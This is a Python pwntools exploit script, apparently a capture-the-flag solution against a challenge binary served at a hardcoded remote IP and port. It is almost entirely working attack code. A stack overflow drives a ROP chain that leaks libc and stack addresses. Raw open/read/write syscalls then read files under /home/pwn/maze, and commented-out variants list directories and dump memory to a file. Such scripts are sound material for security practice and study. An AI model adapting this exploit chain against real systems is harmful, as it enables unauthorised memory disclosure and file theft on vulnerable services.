#!/usr/bin/python3

from pwn import *
def read_lines_to_list(file_path):
    lines = []
    with open(file_path, 'r') as file:
        for line in file:
            lines.append(line.strip())
    return lines

file_path = 'flag.txt'
lines_list = read_lines_to_list(file_path)
for i in lines_list:
    exe = ELF('chall_patched', checksec=False)
    libc = ELF('libc.so.6', checksec=False)
    context.binary = exe

    def GDB():
            if not args.REMOTE:
                    gdb.attach(p, gdbscript='''
                    b*0x00000000004014d9 

                    c
                    ''')
                    input()
    # rop.write(7, 8, 9)
    # find_gadget(['pop rdi, ret'])
    info = lambda msg: log.info(msg)
    sla = lambda msg, data: p.sendlineafter(msg, data)
    sa = lambda msg, data: p.sendafter(msg, data)
    sl = lambda data: p.sendline(data)
    s = lambda data: p.send(data)

    if args.REMOTE:
            p = remote('3.75.185.198', 10000)
    else:
            p = process(exe.path)
    rop = ROP(exe)
    pop_3 = 0x00000000004014d9
    base = 0x404100
    payload = b'a'*32 + flat(
            base+0x20,
            pop_3, 0, base, 0xa00,
            exe.sym.read,
            pop_3, base, exe.got.read, 0,
            exe.plt.printf,
            0x000000000040150a
    )
    sla(b'Input: ', payload)
    sleep(2)
    s(b'%s\0')

    libc.address = u64(p.recv(6) + b'\0\0') - libc.sym.read 
    info("libc base: " + hex(libc.address))
    sleep(1)


    rop = ROP(libc)
    pop_rax = rop.find_gadget(['pop rax', 'ret']).address
    syscall = rop.find_gadget(['syscall', 'ret']).address
    push_rax = libc.address + 0x0000000000041563

    payload = b'/home/pwn/maze\0%s\0'.ljust(0x28) + flat(
            pop_3, 1, libc.sym.environ, 8,
            pop_rax, 1,
            syscall,
            pop_3, 0, 0x404188-0x28, 0xa00,
            exe.sym.read,
    )
    s(payload)
    stack = u64(p.recv(8)) - 0x5000
    info("stack: " + hex(stack))
    sleep(1)




    payload = f'/home/pwn/maze/ZjZjTRiy1W4dOQJA\0'.encode().ljust(0x28) + flat(
            pop_3, 0x404160, 0, 0, 
            pop_rax,2,
            syscall, 
            pop_3, 5, stack, 0x50,
            pop_rax,0,
            syscall, 
            pop_3, 1, stack, 0x50,
            pop_rax,1,
            syscall,
    )
    s(payload)
    print(i + str(p.recv()))
    p.close()



# payload = f'/home/pwn/maze/IKyGlIs3N"\0'.encode().ljust(0x28) + flat(
#         pop_3, 0x404160, 0, 0, 
#         pop_rax,2,
#         syscall, 
#         pop_3, 3, stack, 0x20,
#         pop_rax,0,
#         syscall, 
#         pop_3, 1, stack, 0x20,
#         pop_rax,1,
#         syscall
# )













# payload = b'/home/pwn/maze\0%s\0'.ljust(0x28) + flat(
#         pop_3, base, 0, 0, 
#         pop_rax,2,
#         syscall, 
#         pop_3, 3, stack, 0x3000,
#         pop_rax,0x4e,
#         syscall, 
#         pop_3, 1, stack, 0x3000,
#         pop_rax,1,
#         syscall

# )
# s(payload)

# def replace_non_printable_bytes(string):
#     output = ""
#     for byte in string:
#         if byte >= 32 and byte <= 126:
#             output += chr(byte)
#         else:
#             output += "\n"
#     return output

# with open(b'flag1.txt', 'a') as file:
#         file.write(replace_non_printable_bytes(p.recv(0x800)))
#         file.write(replace_non_printable_bytes(p.recv(0x800)))
#         file.write(replace_non_printable_bytes(p.recv(0x800)))
#         file.write(replace_non_printable_bytes(p.recv(0x800)))
#         file.write(replace_non_printable_bytes(p.recv(0x800)))